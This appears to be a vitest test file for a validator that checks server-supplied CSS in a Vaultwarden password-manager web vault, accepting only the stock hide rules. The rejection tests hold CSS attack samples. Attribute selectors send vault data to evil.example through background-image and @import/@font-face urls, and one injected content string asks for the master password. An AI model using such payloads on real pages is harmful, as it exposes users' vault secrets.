import {describe, expect, it} from 'vitest';
import {
  checkServerStyle,
  checkVaultwardenCss,
  MAX_SERVER_STYLE_BYTES,
  STYLE_VALIDATORS,
  type StyleValidator,
  VAULTWARDEN_STOCK_HIDE_SELECTORS,
} from '../src/style/serverStyle.ts';
import {utf8} from '../src/hash/sha256.ts';

const check = (css: string) => checkVaultwardenCss(utf8(css));

const ICON =
  'bit-nav-logo bit-nav-item a:before{content:"";background-image:url("../images/icon-white.svg");' +
  'background-repeat:no-repeat;background-position:center center;height:32px;display:block}';

/**
 * What grass makes of vaultwarden.scss.hbs (1.37.5) with the default flags,
 * compressed: every @extend %vw-hide selector in one rule, then the icon rule.
 * The exact output on every flag combination is not known yet.
 */
const STOCK =
  '.vw-hide,head,bit-nav-item[route="settings/subscription"],a[href$="/settings/sponsored-families"],' +
  '.vw-email-sso,.vw-sso-login,app-user-layout app-password-settings app-webauthn-login-settings,' +
  '.vw-passkey-login,.vw-or-text,.vw-other-login,bit-nav-item[route="settings/two-factor"],' +
  'a[href$="/settings/two-factor"],app-organization-plans>form>bit-section:nth-child(2),' +
  'app-org-account form.ng-untouched:nth-child(5),' +
  'app-org-reports-home>app-report-list>div.tw-inline-grid>div:nth-child(6),' +
  'app-security>app-two-factor-setup>form,' +
  ':is(bit-dialog,[bit-dialog]) div.tw-ml-4:has(bit-form-control input),' +
  ':is(bit-dialog,[bit-dialog]) div.tw-col-span-4:has(input[formcontrolname*=access],input[formcontrolname*=manage]),' +
  'bit-nav-logo bit-nav-item .bwi-shield,app-user-layout app-danger-zone button:nth-child(1),' +
  'ng-dropdown-panel div.ng-dropdown-panel-items div:has(>[title="Firefox Relay"]),' +
  'ng-dropdown-panel div.ng-dropdown-panel-items div:has(>[title=DuckDuckGo]),' +
  '.providers-2fa-1,.providers-2fa-3,.providers-2fa-7{display:none !important}' +
  ICON;

describe('vaultwarden-css/v1: accepted', () => {
  it('accepts the stock compressed output', () => {
    const r = check(STOCK);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.hidden).toHaveLength(25);
      expect(r.hidden).toContain('bit-nav-item[route="settings/subscription"]');
      // Canonical form: unquoted identifier values are quoted.
      expect(r.hidden).toContain(
        'ng-dropdown-panel div.ng-dropdown-panel-items div:has(>[title="DuckDuckGo"])',
      );
    }
  });

  it('accepts expanded output, several hide rules and a trailing newline', () => {
    const css = `
      .vw-hide,
      head {
        display: none ! important;
      }
      app-root a[routerlink="/signup"] { display : none }
      bit-nav-logo   bit-nav-item a:before {
        display: block;
        height: 32px;
        background-position: center   center;
        background-repeat: no-repeat;
        background-image: url(../images/icon-white.svg);
        content: '';
      }
    `;
    expect(check(css)).toEqual({
      ok: true,
      hidden: ['.vw-hide', 'head', 'app-root a[routerlink="/signup"]'],
    });
  });

  it('accepts an empty stylesheet (what the engine substitutes for a rejected one)', () => {
    expect(check('')).toEqual({ok: true, hidden: []});
    expect(check(' \n\t')).toEqual({ok: true, hidden: []});
  });

  /** Roughly what grass's compressed style does to a selector of the template. */
  const compress = (selector: string) =>
    selector
      .replaceAll(' > ', '>')
      .replaceAll(', ', ',')
      .replaceAll('(> ', '(>')
      .replaceAll('="access"', '=access')
      .replaceAll('="manage"', '=manage')
      .replaceAll('="DuckDuckGo"', '=DuckDuckGo')
      .replaceAll('="sends"', '=sends');

  it.each([...VAULTWARDEN_STOCK_HIDE_SELECTORS])(
    'accepts the stock selector %s, as written and compressed',
    selector => {
      for (const css of [
        `${selector} { display: none !important; }`,
        `${compress(selector)}{display:none!important}`,
        `${selector.replaceAll('"', "'")}{display:none}`,
      ]) {
        const r = check(css);
        expect(r.ok, css).toBe(true);
        if (r.ok) expect(r.hidden).toHaveLength(1);
      }
    },
  );

  it('accepts every stock selector in one rule, whatever the flags', () => {
    const all = VAULTWARDEN_STOCK_HIDE_SELECTORS.map(compress).join(',');
    const r = check(`${all}{display:none!important}${ICON}`);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.hidden).toHaveLength(VAULTWARDEN_STOCK_HIDE_SELECTORS.length);
  });
});

describe('vaultwarden-css/v1: hiding selectors outside the stock list', () => {
  // Hiding stops lazy-loaded images (/icons/<host>/icon.png) and
  // virtual-scroll fetches, so a selector that depends on vault data tells
  // the server what is on the page through requests that never arrive.
  const refused = [
    'tr:has([title^="Edit item - a"]) app-vault-icon{display:none!important}',
    'input[value^="a"]~img{display:none}',
    // An admin's own rule, even a harmless-looking one.
    '.my-banner{display:none}',
    '.vw-hide,.my-banner{display:none!important}',
    // Close to a stock selector but not equal to it.
    'bit-nav-item[route="settings/subscription" i]{display:none}',
    'bit-nav-item[route^="settings/subscription"]{display:none}',
    'BIT-NAV-ITEM[route="settings/subscription"]{display:none}',
    // Space before "[" is a descendant combinator: a different selector.
    'bit-nav-item [route="settings/subscription"]{display:none}',
    // Whitespace inside a string is significant (never normalised away).
    'ng-dropdown-panel div.ng-dropdown-panel-items div:has(>[title="Firefox  Relay"]){display:none}',
    'ng-dropdown-panel div.ng-dropdown-panel-items div:has(>[title="Firefox\tRelay"]){display:none}',
    // A stock selector made data-dependent.
    '.providers-2fa-1:has([title^="a"]){display:none}',
    'head,tr:nth-child(50) app-vault-icon{display:none}',
  ];

  it.each(refused)('refuses %s as custom-rules', css => {
    const r = check(css);
    expect(r).toMatchObject({ok: false, reason: 'custom-rules'});
    if (!r.ok) expect(r.detail).toContain('not a stock Vaultwarden selector');
    // Also next to the stock output: one foreign selector is enough.
    expect(check(STOCK + css)).toMatchObject({ok: false, reason: 'custom-rules'});
  });

  it('refuses an empty selector in a list as malformed', () => {
    for (const css of [
      '.vw-hide,{display:none}',
      ',head{display:none}',
      'head,,head{display:none}',
    ]) {
      expect(check(css), css).toMatchObject({ok: false, reason: 'malformed'});
    }
  });
});

describe('vaultwarden-css/v1: custom rules', () => {
  const custom = [
    'x{color:red}',
    'x{display:block}',
    'x{display:none;color:red}',
    'x{display:none;display:none}',
    'x{display:none !important garbage}',
    'x{visibility:hidden}',
    'input[value^="a"]{background-image:url(https://evil.example/a)}',
    'x{background:url(/leak?q=1)}',
    'x::after{content:"Enter your master password here"}',
    'x{font-family:evil}',
    // The icon rule with another image, selector or an extra declaration.
    ICON.replace('icon-white.svg', 'icon-dark.svg'),
    ICON.replace('bit-nav-logo bit-nav-item a:before', 'a:before'),
    ICON.replace('display:block}', 'display:block;color:red}'),
    ICON.replace('height:32px;', ''),
    ICON.replace('height:32px', 'height:32px;height:32px'),
  ];

  it.each(custom)('refuses %s', css => {
    const r = check(STOCK + css);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('custom-rules');
  });
});

describe('vaultwarden-css/v1: malformed', () => {
  const malformed: Array<[string, string]> = [
    ['@import url(https://evil.example/x.css);', 'at-rules'],
    ['@font-face{font-family:x;src:url(https://evil.example/f)}', 'at-rules'],
    ['@media print{x{display:none}}', 'at-rules'],
    ['/* hi */x{display:none}', 'comments'],
    ['x{display:no\\ne}', 'backslash'],
    ['x{display:none}é{display:none}', 'printable ASCII'],
    ['x{display:none}\u0000', 'printable ASCII'],
    ['x{display:none', 'missing "}"'],
    ['x', 'missing "{"'],
    ['{display:none}', 'without a selector'],
    ['x{y{display:none}}', 'unexpected "{"'],
    ['x{display:none}}', 'unexpected "}"'],
    [';x{display:none}', 'unexpected ";"'],
    // Braces inside () or [] nest in CSS; refused so brace matching agrees.
    ['x:is({){display:none}', 'inside parentheses'],
    ['x{display:none}y{a:url(})}', 'inside parentheses'],
    ['x[a=";"]{display:none}', 'in a string'],
    ['x[a="{"]{display:none}', 'in a string'],
    ['x[a="b\n"]{display:none}', 'in a string'],
    ['x[a="b]{display:none}', 'in a string'],
    ['x[a="b', 'unterminated'],
    ['x)y{display:none}', 'unbalanced'],
    ['x(y{display:none}', 'inside parentheses'],
    ['x{display}', 'missing ":"'],
    ['x{display:}', 'malformed declaration'],
    ['x{DISPLAY:NONE}', 'malformed declaration'],
    ['x{--hidden:none}', 'malformed declaration'],
    ['x{display:none:x}', 'unexpected ":"'],
  ];

  it.each(malformed)('refuses %j', (css, detail) => {
    const r = check(css);
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.reason).toBe('malformed');
      expect(r.detail).toContain(detail);
    }
  });

  it('bounds the input size', () => {
    const rule = 'head{display:none}';
    const big = rule.repeat(Math.ceil(MAX_SERVER_STYLE_BYTES / rule.length) + 1);
    expect(check(big)).toMatchObject({ok: false, reason: 'malformed'});
    expect(check(rule.repeat(Math.floor(MAX_SERVER_STYLE_BYTES / rule.length))).ok).toBe(true);
  });
});

describe('checkServerStyle', () => {
  it('dispatches on the closed validator list and never throws', () => {
    expect([...STYLE_VALIDATORS]).toEqual(['vaultwarden-css/v1']);
    expect(checkServerStyle('vaultwarden-css/v1', utf8(STOCK)).ok).toBe(true);
    expect(checkServerStyle('other/v1' as StyleValidator, utf8(STOCK))).toMatchObject({
      ok: false,
      reason: 'malformed',
    });
    expect(checkVaultwardenCss('x{}' as unknown as Uint8Array)).toMatchObject({ok: false});
  });
});
